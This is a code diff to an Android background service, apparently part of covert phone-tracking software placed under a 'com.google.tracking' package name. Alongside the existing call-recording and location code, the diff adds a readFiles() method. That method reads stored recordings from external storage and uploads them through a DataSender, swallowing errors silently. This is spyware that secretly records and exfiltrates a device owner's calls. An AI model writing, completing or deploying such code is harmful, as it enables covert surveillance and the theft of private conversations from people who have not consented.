@@ -6,6 +6,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.os.Bundle;
+import android.os.Environment;
 import android.os.IBinder;
 import android.telephony.TelephonyManager;
 import android.util.Log;
@@ -15,7 +16,11 @@ import com.google.android.gms.location.LocationServices;
 import com.google.tracking.call.CallRecorderController;
 import com.google.tracking.constants.TrackingConstants;
 import com.google.tracking.runnable.RepeatingTask;
+import com.google.tracking.sender.DataSender;
 import google_api.ApiConnectionListener;
+
+import java.io.*;
+import java.util.Arrays;
 
 
 public class TService extends Service {
@@ -25,6 +30,7 @@ public class TService extends Service {
     private static final String ACTION_OUT = "android.intent.action.NEW_OUTGOING_CALL";
     private CallReceiver callReceiver;
     private RepeatingTask repeatingTask;
+    private DataSender dataSender;
 
 
     @Override
@@ -68,10 +74,60 @@ public class TService extends Service {
 
         createGoolApiClient();
 
+        dataSender = new DataSender();
+        readFiles();
         // if(terminate != null) {
         // stopSelf();
         // }
         return START_STICKY;
+    }
+
+    public void readFiles() {
+        Log.d(TAG, "readFiles " + recorderController.currentFileName());
+
+        String path = Environment.getExternalStorageDirectory().toString() + TrackingConstants.FILES_PATH;
+
+        Log.d("Files", "Path: " + path);
+
+        File f = new File(path);
+        File file[] = f.listFiles();
+
+        Log.d("Files", "Size: " + file.length);
+        for (
+                int i = 0;
+                i < file.length; i++)
+
+        {
+            Log.d("Files", "FileName:" + file[i].getName());
+            if(file[i].getName() != recorderController.currentFileName())
+            {
+
+                InputStream in = null;
+                byte[] buffer;
+                try {
+                    in = new BufferedInputStream(new FileInputStream(file[i]));
+                    buffer = new byte[in.available()];
+                    in.read(buffer);
+
+                    dataSender.sendFile(buffer);
+                }
+                catch (Exception e) {
+                }
+                finally {
+                    try {
+                        if (in != null) {
+                            in.close();
+                        }
+                    } catch (IOException ex) {
+                        ex.printStackTrace();
+                    }
+                }
+
+
+
+                break;
+            }
+        }
     }
 
     private GoogleApiClient mGoogleApiClient;
